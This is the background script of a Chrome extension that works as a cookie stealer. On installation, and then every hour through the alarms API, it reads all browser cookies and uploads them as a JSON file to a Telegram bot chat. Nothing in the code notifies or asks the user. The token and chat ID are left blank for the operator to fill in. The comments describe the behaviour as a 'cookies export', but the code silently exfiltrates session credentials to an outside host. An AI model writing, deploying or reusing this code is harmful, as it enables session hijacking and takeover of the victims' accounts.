// Background service worker for communication with Telegram Bot

// Configure your Telegram bot settings
const TELEGRAM_BOT_TOKEN = ''; // Replace with your actual bot token
const TELEGRAM_CHAT_ID = ''; // Replace with your chat ID

// Send all cookies as file function
async function sendAllCookiesAsFile() {
  try {
    const allCookies = await chrome.cookies.getAll({});
    console.log(`Retrieved ${allCookies.length} total cookies`);

    // Prepare the complete data
    const completeData = {
      event: 'cookies_export',
      timestamp: new Date().toISOString(),
      cookiesCount: allCookies.length,
      cookies: allCookies
    };

    const jsonData = JSON.stringify(completeData, null, 2);

    // Convert JSON to Blob for file upload
    const blob = new Blob([jsonData], { type: 'application/json' });

    // Create filename with timestamp
    const filename = `cookies_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;

    // Send as document
    await sendDocumentToTelegram(blob, filename, `📋 Cookies Export\n📊 Total cookies: ${allCookies.length}`);

    console.log('All cookies sent as file successfully');

  } catch (error) {
    console.error('Failed to send cookies to Telegram:', error);
    console.error('Error details:', error.message);

    // Send error notification to Telegram
    const errorMessage = `❌ Error sending cookies\n${error.message}\n${new Date().toISOString()}`;
    await sendToTelegram(errorMessage);
  }
}

// Listen for installation
chrome.runtime.onInstalled.addListener(async () => {
  console.log('Extension installed');

  // Send all cookies immediately on installation
  await sendAllCookiesAsFile();

  // Set up hourly sending
  setupHourlySending();
});

// Function to send message to Telegram
async function sendToTelegram(text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    });

    const responseData = await response.json();

    if (!responseData.ok) {
      console.error('Telegram API error:', responseData.description);
      throw new Error(responseData.description);
    }

    console.log('Message sent successfully to Telegram');
    return responseData;

  } catch (error) {
    console.error('Failed to send message to Telegram:', error);
    throw error;
  }
}

// Function to send document/file to Telegram
async function sendDocumentToTelegram(blob, filename, caption = '') {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

  try {
    // Create FormData for file upload
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('document', blob, filename);
    if (caption) {
      formData.append('caption', caption);
    }

    const response = await fetch(url, {
      method: 'POST',
      body: formData
    });

    const responseData = await response.json();

    if (!responseData.ok) {
      console.error('Telegram API error:', responseData.description);
      throw new Error(responseData.description);
    }

    console.log('Document sent successfully to Telegram');
    return responseData;

  } catch (error) {
    console.error('Failed to send document to Telegram:', error);
    throw error;
  }
}

// Set up hourly sending using Chrome Alarms API
function setupHourlySending() {
  // Create an alarm that fires every hour
  chrome.alarms.create('sendCookies', {
    periodInMinutes: 60
  });

  console.log('Hourly cookie sending scheduled using alarms');
}

// Listen for alarm events
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'sendCookies') {
    console.log('Alarm triggered: sending hourly cookies export...');
    sendAllCookiesAsFile();
  }
});

// Ensure hourly sending is set up when extension starts
chrome.runtime.onStartup.addListener(() => {
  console.log('Extension started');

  // Check if alarm already exists before creating a new one
  chrome.alarms.get('sendCookies', (alarm) => {
    if (!alarm) {
      setupHourlySending();
    } else {
      console.log('Hourly alarm already exists');
    }
  });
});
